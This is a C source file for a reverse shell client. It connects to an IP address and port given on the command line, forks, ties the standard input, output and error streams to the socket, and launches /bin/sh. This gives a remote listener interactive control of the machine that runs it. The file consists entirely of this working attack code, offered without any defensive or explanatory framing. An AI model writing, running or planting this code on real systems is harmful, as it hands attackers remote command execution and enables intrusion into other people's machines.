// reverse shell client code

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>




void error(char *msg){
    // Only for development and debugging purpose
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[]){

    const char *ip_addr = argv[1];
    const int port = atoi(argv[2]);

    int sockfd, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;   // struct to contain info about host

    sockfd = socket(AF_INET, SOCK_STREAM, 0);


    if(sockfd < 0){
        error("Error, while opening socket\n");
    }


    bzero((char*)&serv_addr, sizeof(serv_addr));
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(ip_addr);
    serv_addr.sin_port = htons(port);
    
    if (connect(sockfd,(struct sockaddr*)&serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");

    pid_t pid = fork();
    if(pid < 0){
        error("Error, Could not create new process!\n");
    }
    else if(pid == 0){
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        dup2(sockfd, 0);
        execl("/bin/sh","/bin/sh",NULL);  // become orphan process
    }
}